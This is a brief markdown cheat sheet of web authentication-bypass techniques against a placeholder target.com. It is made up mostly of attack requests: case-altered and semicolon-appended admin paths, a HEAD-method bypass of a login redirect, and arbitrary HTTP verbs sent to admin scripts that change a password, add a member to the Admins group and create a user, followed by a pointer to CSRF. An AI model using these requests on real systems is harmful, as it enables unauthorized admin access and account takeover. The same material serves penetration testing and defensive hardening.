### Sensitive Files Access
```
http://sub.target.com/web/admin/ --> 302 Redirect -> Main domain
http://sub.target.com/web/aDmiN/ --> 200 Ok -> Admin login page
http://sub.target.com/web/aDmiN/FUZZ --> Critical Sensitive Files
```
#### Bypass Authentication
```
http://sub.target.com/web/admin;/
```

### Auth Bypass via HTTP Request Method

#### HAED Method
```
If a page redirect(302) to login page to access that page try HEAD
method.

http://target.com/web/admin/ --> 302 Redirect --> http://target.com/web/admin/login

HEAD /admin HTTP/1.1
Host: target.com
```
#### Arbitrary Methods
```
JEFF /admin/changePw.php?member=myAdmin&passwd=foo123&confirm=foo123
CATS /admin/groupEdit.php?group=Admins&member=myAdmin&action=add
FOOBAR /admin/createUser.php?member=myAdmin
```
##### If this methods return white page then try to exploit via CSRF attack.
